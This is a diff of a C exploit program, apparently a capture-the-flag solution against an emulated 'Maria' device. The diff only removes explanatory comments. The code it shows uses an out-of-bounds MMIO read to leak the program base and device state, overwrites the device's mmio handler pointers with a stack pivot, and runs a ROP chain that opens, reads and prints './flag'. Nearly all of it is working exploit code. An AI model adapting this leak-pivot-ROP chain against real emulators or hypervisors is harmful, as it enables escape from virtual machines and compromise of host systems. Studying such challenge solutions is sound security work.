@@ -214,7 +214,7 @@ int main(void)
 
     set_src(buf_gpa);
     set_off(0xF0);
-    get_buf(); // Out of bounds read
+    get_buf(); 
 
     uint64_t progbase = *(uint64_t *)(buf + (0x2000 - 0xf0) + 0x88) - 0x81dae0;
     logOK("Leaked progbase: %p", (void *)progbase);
@@ -226,31 +226,29 @@ int main(void)
     logOK("Leaked MariaState: %p", (void *)MariaState);
 
     logInfo("Building ROP chain...");
-    uint64_t xchg_edi_eax = progbase + 0x3584d5; /* xchg edi, eax ; ret */
-    uint64_t xchg_edx_eax = progbase + 0x309c8a; /* xchg edx, eax ; ret */
-    uint64_t pivot = progbase + 0xb1088a;        /* push rax ; pop rsp ; mov eax, 1 ; pop rbp ; ret */
-    uint64_t pop_rdi = progbase + 0x632c5d;      /* pop rdi ; ret */
-    uint64_t pop_rsi = progbase + 0x4d4db3;      /* pop rsi ; ret */
-    uint64_t pop_rdx = progbase + 0x47f5c8;      /* pop rdx ; ret */
-    uint64_t pop_rax = progbase + 0x3643a4;      /* pop rax ; ret */
-    uint64_t syscall = progbase + 0x4a22ec;      /* syscall; add cl, cl; ret; */
+    uint64_t xchg_edi_eax = progbase + 0x3584d5; 
+    uint64_t xchg_edx_eax = progbase + 0x309c8a; 
+    uint64_t pivot = progbase + 0xb1088a;        
+    uint64_t pop_rdi = progbase + 0x632c5d;      
+    uint64_t pop_rsi = progbase + 0x4d4db3;      
+    uint64_t pop_rdx = progbase + 0x47f5c8;     
+    uint64_t pop_rax = progbase + 0x3643a4;     
+    uint64_t syscall = progbase + 0x4a22ec;      
 
     char *base = buf + (0x2000 - 0xf0);
 
     uint64_t idx = 0;
     uint64_t *rop = (uint64_t *)&base[-0x700];
 
-    U64_AT(0x48) = ((MariaState + 0x2a30) - 0x800); /* replace maria->mmio */
-    U64_AT(0x50) = ((MariaState + 0x2a30) - 0x700); /* ROP storage pointer */
+    U64_AT(0x48) = ((MariaState + 0x2a30) - 0x800); 
+    U64_AT(0x50) = ((MariaState + 0x2a30) - 0x700); 
 
-    U64_AT(-0x800) = pivot; /* fake mmio write */
-    U64_AT(-0x7f8) = pivot; /* fake mmio read  */
+    U64_AT(-0x800) = pivot; 
+    U64_AT(-0x7f8) = pivot; 
 
-    /* store "./flag" for open() */
     strcpy(&base[-0x500], "./flag");
 
-    rop[idx++] = 0xdeadbeef; // for pop rbp
-    // open
+    rop[idx++] = 0xdeadbeef; 
     rop[idx++] = pop_rdi;
     rop[idx++] = ((MariaState + 0x2a30) - 0x500);
     rop[idx++] = pop_rsi;
@@ -258,7 +256,6 @@ int main(void)
     rop[idx++] = pop_rax;
     rop[idx++] = 2;
     rop[idx++] = syscall;
-    // read
     rop[idx++] = xchg_edi_eax;
     rop[idx++] = pop_rsi;
     rop[idx++] = ((MariaState + 0x2a30) - 0x400);
@@ -267,21 +264,19 @@ int main(void)
     rop[idx++] = pop_rax;
     rop[idx++] = 0;
     rop[idx++] = syscall;
-    // write
     rop[idx++] = xchg_edx_eax;
     rop[idx++] = pop_rdi;
     rop[idx++] = 1;
     rop[idx++] = pop_rax;
     rop[idx++] = 1;
     rop[idx++] = syscall;
-    // exit
     rop[idx++] = pop_rax;
     rop[idx++] = 60;
     rop[idx++] = syscall;
 
     logInfo("Triggering ROP chain...");
     set_buf();
-    set_off(0x0); // trigger
+    set_off(0x0); 
 
     logInfo("Cleaning up...");
     munmap(mmio_mem, PAGE_SIZE * 4);
